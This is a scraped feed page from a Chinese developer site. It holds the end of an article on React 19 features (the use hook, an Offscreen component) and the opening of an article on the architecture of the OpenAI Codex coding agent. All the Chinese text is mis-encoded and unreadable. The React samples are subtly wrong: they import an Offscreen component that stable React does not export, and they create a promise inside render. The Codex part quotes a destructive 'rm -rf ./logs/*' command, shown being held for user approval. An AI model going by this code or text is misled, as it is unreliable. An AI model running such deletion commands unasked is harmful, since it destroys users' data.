<h2 data-id="heading-16">use Hookï¼šç»Ÿä¸€æ•°æ®åŠ è½½æ¨¡å¼</h2>
<h3 data-id="heading-17"><strong>èƒŒæ™¯ä¸ç—›ç‚¹</strong></h3>
<p>æ•°æ®åŠ è½½é€šå¸¸éœ€è¦æ··åˆä½¿ç”¨<code>useEffect</code>ã€ç¬¬ä¸‰æ–¹çŠ¶æ€åº“å’Œè‡ªå®šä¹‰Hookï¼Œå¯¼è‡´ä»£ç ç¢ç‰‡åŒ–ã€‚</p>
<h3 data-id="heading-18"><code>use</code> Hookçš„é©å‘½æ€§è®¾è®¡</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { use } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(<span class="hljs-title function_">fetchUser</span>(userId)); <span class="hljs-comment">// Promiseä¼šè¢«è‡ªåŠ¨resolve</span>

<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-19"><strong>æ ¸å¿ƒä¼˜åŠ¿</strong></h3>
<ol>
<li><strong>åŒæ­¥å†™æ³•å¤„ç†å¼‚æ­¥é€»è¾‘</strong></li>
<li><strong>å…¼å®¹Suspenseè¾¹ç•Œ</strong></li>
</ol>
<hr/>
<h2 data-id="heading-20">Offscreen Renderingï¼šé¢„æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–</h2>
<p>###æŠ€æœ¯åŸç†
é€šè¿‡<code>&lt;Offscreen&gt;</code>ç»„ä»¶å®ç°ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Offscreen</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> (
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Offscreen</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"hidden"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HeavyComponent</span> /&gt;</span> {/*ä¸ä¼šè¢«å®é™…æ¸²æŸ“*/}
<span class="hljs-tag">&lt;/<span class="hljs-name">Offscreen</span>&gt;</span></span>
);
}
</code></pre>
<hr/>
<p>##æ€»ç»“</p>
<p>React19çš„äº”é¡¹é©æ–°ä»ä¸åŒç»´åº¦è§£å†³äº†å‰ç«¯å¼€å‘çš„æ·±å±‚æ¬¡ç—›ç‚¹ï¼š</p>
<ol>
<li>RSCé‡å¡‘äº†æ¸²æŸ“æ¨¡å‹è¾¹ç•Œ</li>
<li>ActionsAPIé‡æ–°å®šä¹‰äº†è¡¨å•äº¤äº’èŒƒå¼</li>
<li>Metadataç»„ä»¶åŒ–æå‡äº†å†…å®¹ç®¡ç†æ•ˆç‡</li>
<li><code>use</code>Hookç»Ÿä¸€äº†å¼‚æ­¥ç¼–ç¨‹æ¨¡å‹</li>
<li>Offscreenä¸ºå¤æ‚åº”ç”¨æä¾›æ€§èƒ½ä¿éšœ</li>
</ol>
<p>è¿™äº›ç‰¹æ€§ä¸æ˜¯å­¤ç«‹å­˜åœ¨è€Œæ˜¯ç›¸äº’å¢å¼ºçš„ç»„åˆæ‹³ã€‚ä¾‹å¦‚RSC+Actionså¯ä»¥æ„å»ºè¶…é«˜æ•ˆç‡çš„å…¨æ ˆåº”ç”¨ï¼›use+Offscreenèƒ½å®ç°æ™ºèƒ½çš„èµ„æºåŠ è½½ç­–ç•¥ã€‚</p>
<p>è¦å®Œå…¨å‘æŒ¥React19çš„å¨åŠ›éœ€è¦è½¬å˜æ€ç»´æ¨¡å¼ï¼š
-ä»"çº¯å®¢æˆ·ç«¯"è½¬å‘æœåŠ¡ç«¯/å®¢æˆ·ç«¯ååŒå¼€å‘
-ä»æ‰‹åŠ¨çŠ¶æ€ç®¡ç†è½¬å‘å£°æ˜å¼API
-ä»å…³æ³¨ç»†èŠ‚å®ç°è½¬å‘å…³æ³¨ä¸šåŠ¡é€»è¾‘</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI Codex æ·±å…¥å‰–æï¼šä¸‹ä¸€ä»£ AI ç¼–ç¨‹åŠ©æ‰‹çš„æ¶æ„ä¸åŸç†]]></title>    <link>https://juejin.cn/post/7592921639464108074</link>    <guid>https://juejin.cn/post/7592921639464108074</guid>    <pubDate>2026-01-09T04:26:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592921639464108074" data-draft-id="7579995569689067554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI Codex æ·±å…¥å‰–æï¼šä¸‹ä¸€ä»£ AI ç¼–ç¨‹åŠ©æ‰‹çš„æ¶æ„ä¸åŸç†"/> <meta itemprop="keywords" content="å‰ç«¯,OpenAI,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-09T04:26:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç ´èŒ§68"/> <meta itemprop="url" content="https://juejin.cn/user/3817931570691031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI Codex æ·±å…¥å‰–æï¼šä¸‹ä¸€ä»£ AI ç¼–ç¨‹åŠ©æ‰‹çš„æ¶æ„ä¸åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817931570691031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç ´èŒ§68
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:26:17.000Z" title="Fri Jan 09 2026 04:26:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±å…¥å‰–æ OpenAI Codexï¼šä¸‹ä¸€ä»£ AI ç¼–ç¨‹åŠ©æ‰‹çš„æ¶æ„ä¸åŸç†</h2>
<blockquote>
<p>æœ¬æ–‡å°†å¸¦ä½ æ·±å…¥äº†è§£ OpenAI Codex çš„å†…éƒ¨æ¶æ„ã€è®¾è®¡æ€è·¯å’Œå®ç°åŸç†ã€‚æ— è®ºä½ æ˜¯åˆå­¦è€…è¿˜æ˜¯æœ‰ç»éªŒçš„å¼€å‘è€…ï¼Œéƒ½èƒ½ä»ä¸­è·å¾—å¯¹ AI ç¼–ç¨‹åŠ©æ‰‹çš„æ·±åˆ»ç†è§£ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ç›®å½•</h3>
<ol>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-codex" title="#%E4%BB%80%E4%B9%88%E6%98%AF-codex">ä»€ä¹ˆæ˜¯ Codexï¼Ÿ</a></li>
<li><a href="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88" title="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88">æ•´ä½“æ¶æ„æ¦‚è§ˆ</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3" title="#%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3">æ ¸å¿ƒç‰¹æ€§è¯¦è§£</a></li>
<li><a href="#%E5%BA%95%E5%B1%82%E5%8D%8F%E8%AE%AE%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6" title="#%E5%BA%95%E5%B1%82%E5%8D%8F%E8%AE%AE%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6">åº•å±‚åè®®ä¸é€šä¿¡æœºåˆ¶</a></li>
<li><a href="#%E8%AE%B0%E5%BF%86%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%AE%B0%E4%BD%8F%E5%AF%B9%E8%AF%9D" title="#%E8%AE%B0%E5%BF%86%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%AE%B0%E4%BD%8F%E5%AF%B9%E8%AF%9D">è®°å¿†ç³»ç»Ÿï¼šå¦‚ä½•è®°ä½å¯¹è¯</a></li>
<li><a href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B7%A5%E7%A8%8B%E6%99%BA%E8%83%BD%E7%AE%A1%E7%90%86%E6%9C%89%E9%99%90%E7%9A%84%E8%84%91%E5%AE%B9%E9%87%8F" title="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B7%A5%E7%A8%8B%E6%99%BA%E8%83%BD%E7%AE%A1%E7%90%86%E6%9C%89%E9%99%90%E7%9A%84%E8%84%91%E5%AE%B9%E9%87%8F">ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼šæ™ºèƒ½ç®¡ç†æœ‰é™çš„"è„‘å®¹é‡"</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7%E7%B3%BB%E7%BB%9F%E8%AE%A9-ai-%E8%83%BD%E5%A4%9F%E5%8A%A8%E6%89%8B" title="#%E5%B7%A5%E5%85%B7%E7%B3%BB%E7%BB%9F%E8%AE%A9-ai-%E8%83%BD%E5%A4%9F%E5%8A%A8%E6%89%8B">å·¥å…·ç³»ç»Ÿï¼šè®© AI èƒ½å¤Ÿ"åŠ¨æ‰‹"</a></li>
<li><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E7%BB%99-ai-%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E6%B8%B8%E4%B9%90%E5%9C%BA" title="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E7%BB%99-ai-%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E6%B8%B8%E4%B9%90%E5%9C%BA">å®‰å…¨æ²™ç®±ï¼šç»™ AI ä¸€ä¸ªå®‰å…¨çš„"æ¸¸ä¹åœº"</a></li>
<li><a href="#mcp-%E5%8D%8F%E8%AE%AE%E8%BF%9E%E6%8E%A5%E5%A4%96%E9%83%A8%E4%B8%96%E7%95%8C%E7%9A%84%E6%A1%A5%E6%A2%81" title="#mcp-%E5%8D%8F%E8%AE%AE%E8%BF%9E%E6%8E%A5%E5%A4%96%E9%83%A8%E4%B8%96%E7%95%8C%E7%9A%84%E6%A1%A5%E6%A2%81">MCP åè®®ï¼šè¿æ¥å¤–éƒ¨ä¸–ç•Œçš„æ¡¥æ¢</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86" title="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">æ‰§è¡Œç­–ç•¥ï¼šæ™ºèƒ½çš„æƒé™ç®¡ç†</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-codex" title="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-codex">å¦‚ä½•ä½¿ç”¨ Codex</a></li>
<li><a href="#%E6%80%BB%E7%BB%93" title="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ Codexï¼Ÿ</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªè¶…çº§èªæ˜çš„ç¼–ç¨‹åŠ©æ‰‹ï¼Œå®ƒä¸ä»…èƒ½ç†è§£ä½ çš„éœ€æ±‚ï¼Œè¿˜èƒ½ç›´æ¥å¸®ä½ å†™ä»£ç ã€è¿è¡Œå‘½ä»¤ã€ä¿®æ”¹æ–‡ä»¶ã€‚è¿™å°±æ˜¯ <strong>Codex</strong> â€”â€” OpenAI æ¨å‡ºçš„æœ¬åœ° AI ç¼–ç¨‹ä»£ç†ã€‚</p>
<h4 data-id="heading-3">ç”¨å¤§ç™½è¯è§£é‡Š</h4>
<p>å¦‚æœæŠŠç¼–ç¨‹æ¯”ä½œåšèœï¼š</p>
<ul>
<li><strong>æ™®é€šçš„ AI åŠ©æ‰‹</strong>ï¼ˆå¦‚ ChatGPTï¼‰å°±åƒä¸€æœ¬èœè°±ï¼Œå‘Šè¯‰ä½ æ€ä¹ˆåšï¼Œä½†ä½ éœ€è¦è‡ªå·±åŠ¨æ‰‹</li>
<li><strong>Codex</strong> å°±åƒä¸€ä¸ªçœŸæ­£çš„å¨å¸ˆï¼Œä¸ä»…å‘Šè¯‰ä½ æ€ä¹ˆåšï¼Œè¿˜èƒ½ç›´æ¥å¸®ä½ æŠŠèœåšå‡ºæ¥</li>
</ul>
<h4 data-id="heading-4">æ ¸å¿ƒèƒ½åŠ›</h4>
<ul>
<li>Codex èƒ½åšä»€ä¹ˆï¼Ÿ
<ul>
<li>ç†è§£ä»£ç ï¼šé˜…è¯»å’Œåˆ†æä½ çš„é¡¹ç›®ä»£ç </li>
<li>ç¼–å†™ä»£ç ï¼šè‡ªåŠ¨ç¼–å†™æ–°åŠŸèƒ½æˆ–ä¿®å¤ bug</li>
<li>æ‰§è¡Œå‘½ä»¤ï¼šè¿è¡Œæµ‹è¯•ã€æ„å»ºé¡¹ç›®ã€git æ“ä½œç­‰</li>
<li>ä¿®æ”¹æ–‡ä»¶ï¼šç›´æ¥ç¼–è¾‘ã€åˆ›å»ºã€åˆ é™¤æ–‡ä»¶</li>
<li>æœç´¢ä¿¡æ¯ï¼šåœ¨ä»£ç åº“ä¸­æœç´¢ï¼Œç”šè‡³è¿›è¡Œç½‘ç»œæœç´¢</li>
<li>è°ƒç”¨å¤–éƒ¨å·¥å…·ï¼šé€šè¿‡ MCP åè®®è¿æ¥å„ç§å¤–éƒ¨æœåŠ¡</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">æ•´ä½“æ¶æ„æ¦‚è§ˆ</h3>
<p>Codex é‡‡ç”¨äº† <strong>Monorepoï¼ˆå•ä¸€ä»£ç ä»“åº“ï¼‰</strong> çš„ç»„ç»‡æ–¹å¼ï¼Œä¸»è¦ç”± Rust å’Œ TypeScript ä¸¤ç§è¯­è¨€æ„å»ºã€‚</p>
<h4 data-id="heading-6">ä¸ºä»€ä¹ˆé€‰æ‹© Rustï¼Ÿ</h4>

























<table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ€§èƒ½</strong></td><td>Rust ç¼–è¯‘æˆæœºå™¨ç ï¼Œè¿è¡Œé€Ÿåº¦æå¿«</td></tr><tr><td><strong>å®‰å…¨</strong></td><td>å†…å­˜å®‰å…¨ä¿è¯ï¼Œé¿å…å¸¸è§çš„å®‰å…¨æ¼æ´</td></tr><tr><td><strong>å¹¶å‘</strong></td><td>ä¼˜ç§€çš„å¼‚æ­¥ç¼–ç¨‹æ”¯æŒï¼Œå¯åŒæ—¶å¤„ç†å¤šä¸ªä»»åŠ¡</td></tr><tr><td><strong>è·¨å¹³å°</strong></td><td>ä¸€å¥—ä»£ç å¯ç¼–è¯‘åˆ° macOSã€Linuxã€Windows</td></tr></tbody></table>
<h4 data-id="heading-7">é¡¹ç›®ç»“æ„å›¾</h4>
<pre><code class="hljs language-bash" lang="bash">codex/
â”œâ”€â”€ codex-rs/           <span class="hljs-comment"># Rust æ ¸å¿ƒä»£ç ï¼ˆ45+ ä¸ªæ¨¡å—ï¼‰</span>
â”‚   â”œâ”€â”€ core/           <span class="hljs-comment"># æ ¸å¿ƒå¼•æ“ - AI çš„"å¤§è„‘"</span>
â”‚   â”œâ”€â”€ tui/            <span class="hljs-comment"># ç»ˆç«¯ç•Œé¢ - ç”¨æˆ·äº¤äº’</span>
â”‚   â”œâ”€â”€ cli/            <span class="hljs-comment"># å‘½ä»¤è¡Œå…¥å£</span>
â”‚   â”œâ”€â”€ <span class="hljs-built_in">exec</span>/           <span class="hljs-comment"># éäº¤äº’å¼æ‰§è¡Œ</span>
â”‚   â”œâ”€â”€ mcp-server/     <span class="hljs-comment"># MCP æœåŠ¡å™¨</span>
â”‚   â””â”€â”€ ...             <span class="hljs-comment"># å…¶ä»–æ”¯æŒæ¨¡å—</span>
â”‚
â”œâ”€â”€ sdk/typescript/     <span class="hljs-comment"># TypeScript SDKï¼ˆç»™å¼€å‘è€…ç”¨çš„åº“ï¼‰</span>
â”œâ”€â”€ shell-tool-mcp/     <span class="hljs-comment"># Shell å·¥å…· MCP å®ç°</span>
â””â”€â”€ docs/               <span class="hljs-comment"># æ–‡æ¡£</span>
</code></pre>
<h4 data-id="heading-8">æ¶æ„åˆ†å±‚å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph UserInterface["ç”¨æˆ·æ¥å£å±‚"]
        CLI["CLI å‘½ä»¤è¡Œ"]
        TUI["TUI ç»ˆç«¯ç•Œé¢"]
        SDK["TypeScript SDK"]
    end

    subgraph CoreEngine["æ ¸å¿ƒå¼•æ“å±‚"]
        Codex["Codex æ ¸å¿ƒå¼•æ“"]
        ModelClient["æ¨¡å‹å®¢æˆ·ç«¯"]
        ContextMgr["ä¸Šä¸‹æ–‡ç®¡ç†å™¨"]
        ToolRouter["å·¥å…·è·¯ç”±å™¨"]
    end

    subgraph ExecutionLayer["æ‰§è¡Œå±‚"]
        ShellExec["Shell æ‰§è¡Œå™¨"]
        FileOps["æ–‡ä»¶æ“ä½œ"]
        MCPClient["MCP å®¢æˆ·ç«¯"]
        WebSearch["ç½‘ç»œæœç´¢"]
    end

    subgraph SecurityLayer["å®‰å…¨å±‚"]
        Sandbox["æ²™ç®±éš”ç¦»"]
        ExecPolicy["æ‰§è¡Œç­–ç•¥"]
        Approval["å®¡æ‰¹ç³»ç»Ÿ"]
    end

    CLI --&gt; Codex
    TUI --&gt; Codex
    SDK --&gt; Codex

    Codex --&gt; ModelClient
    Codex --&gt; ContextMgr
    Codex --&gt; ToolRouter

    ToolRouter --&gt; ShellExec
    ToolRouter --&gt; FileOps
    ToolRouter --&gt; MCPClient
    ToolRouter --&gt; WebSearch

    ShellExec --&gt; Sandbox
    ShellExec --&gt; ExecPolicy
    FileOps --&gt; Sandbox
    FileOps --&gt; Approval
    MCPClient --&gt; Approval

    style UserInterface fill:#E3F2FD,stroke:#1976D2
    style CoreEngine fill:#E8F5E9,stroke:#388E3C
    style ExecutionLayer fill:#FFF3E0,stroke:#F57C00
    style SecurityLayer fill:#FCE4EC,stroke:#C2185B

</code></pre>
<p>Codex çš„æ¶æ„å¯ä»¥åˆ†ä¸ºå››å±‚ï¼š</p>
<ol>
<li><strong>ç”¨æˆ·æ¥å£å±‚</strong>ï¼šä½ ä¸ Codex äº¤äº’çš„å…¥å£ï¼ˆCLIã€TUIã€SDKï¼‰</li>
<li><strong>æ ¸å¿ƒå¼•æ“å±‚</strong>ï¼šå¤„ç† AI æ¨ç†ã€å·¥å…·è°ƒç”¨ã€ä¸Šä¸‹æ–‡ç®¡ç†</li>
<li><strong>æ‰§è¡Œå±‚</strong>ï¼šå®é™…æ‰§è¡Œå‘½ä»¤ã€ä¿®æ”¹æ–‡ä»¶ã€è°ƒç”¨å¤–éƒ¨æœåŠ¡</li>
<li><strong>å®‰å…¨å±‚</strong>ï¼šæ²™ç®±éš”ç¦»ã€æƒé™æ§åˆ¶ã€æ‰§è¡Œç­–ç•¥</li>
</ol>
<hr/>
<h3 data-id="heading-9">æ ¸å¿ƒç‰¹æ€§è¯¦è§£</h3>
<h4 data-id="heading-10">1. å¤šæ¨¡å¼äº¤äº’</h4>
<p>Codex æ”¯æŒä¸‰ç§ä½¿ç”¨æ¨¡å¼ï¼š</p>




















<table><thead><tr><th>äº¤äº’å¼ TUI</th><th>éäº¤äº’å¼ Exec</th><th>SDK é›†æˆ</th></tr></thead><tbody><tr><td><strong>å®æ—¶å¯¹è¯ç•Œé¢</strong></td><td>è‡ªåŠ¨åŒ–è„šæœ¬æ‰§è¡Œ</td><td>åµŒå…¥åˆ°ä½ çš„åº”ç”¨</td></tr><tr><td><strong>é€‚åˆæ—¥å¸¸å¼€å‘</strong></td><td>é€‚åˆ CI/CD</td><td>é€‚åˆæ„å»ºäº§å“</td></tr></tbody></table>
<h4 data-id="heading-11">2. ä¼šè¯ç®¡ç†</h4>
<p>æ¯æ¬¡ä¸ Codex çš„å¯¹è¯éƒ½æ˜¯ä¸€ä¸ª"ä¼šè¯"ï¼ˆSessionï¼‰ã€‚Codex ä¼šï¼š</p>
<ul>
<li>è®°ä½ä½ ä»¬çš„å¯¹è¯å†å²</li>
<li>ä¿å­˜æ‰§è¡Œè¿‡çš„å‘½ä»¤å’Œç»“æœ</li>
<li>æ”¯æŒæš‚åœå’Œæ¢å¤å¯¹è¯</li>
</ul>
<h4 data-id="heading-12">3. æ™ºèƒ½å®¡æ‰¹</h4>
<p>Codex ä¸ä¼šç›²ç›®æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ã€‚å¯¹äºå±é™©æ“ä½œï¼Œå®ƒä¼šï¼š</p>
<pre><code class="hljs language-ini" lang="ini">ä½ : å¸®æˆ‘åˆ é™¤æ‰€æœ‰æ—¥å¿—æ–‡ä»¶
Codex: æˆ‘éœ€è¦æ‰§è¡Œ `rm -rf ./logs/*`ï¼Œè¿™ä¼šåˆ é™¤æ‰€æœ‰æ—¥å¿—ã€‚
       <span class="hljs-section">[å…è®¸æ‰§è¡Œ]</span> <span class="hljs-section">[æ‹’ç»]</span> <span class="hljs-section">[ç™½åå•æ­¤å‘½ä»¤]</span>
</code></pre>
<hr/>
<h3 data-id="heading-13">åº•å±‚åè®®ä¸é€šä¿¡æœºåˆ¶</h3>
<h4 data-id="heading-14">æäº¤é˜Ÿåˆ—/äº‹ä»¶é˜Ÿåˆ—ï¼ˆSQ/EQï¼‰æ¨¡å¼</h4>
<p>Codex å†…éƒ¨ä½¿ç”¨äº†ä¸€ç§é«˜æ•ˆçš„å¼‚æ­¥é€šä¿¡æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram
    participant User as ç”¨æˆ·/TUI
    participant SQ as æäº¤é˜Ÿåˆ— (SQ)
    participant Engine as Codex æ ¸å¿ƒå¼•æ“
    participant LLM as å¤§è¯­è¨€æ¨¡å‹
    participant Tools as å·¥å…·ç³»ç»Ÿ
    participant EQ as äº‹ä»¶é˜Ÿåˆ— (EQ)

    User-&gt;&gt;SQ: æäº¤ç”¨æˆ·è¾“å…¥
    Note over SQ: Op::UserTurn

    SQ-&gt;&gt;Engine: å¼‚æ­¥æ¥æ”¶æäº¤
    Engine-&gt;&gt;LLM: è°ƒç”¨æ¨¡å‹ API

    LLM--&gt;&gt;Engine: æµå¼å“åº”
    Engine-&gt;&gt;EQ: å‘é€ AgentMessage äº‹ä»¶
    EQ--&gt;&gt;User: å®æ—¶æ˜¾ç¤º AI å›å¤

    LLM--&gt;&gt;Engine: å·¥å…·è°ƒç”¨è¯·æ±‚
    Engine-&gt;&gt;Tools: æ‰§è¡Œå·¥å…·
    Engine-&gt;&gt;EQ: å‘é€ ExecApprovalRequest
    EQ--&gt;&gt;User: è¯·æ±‚ç”¨æˆ·æ‰¹å‡†

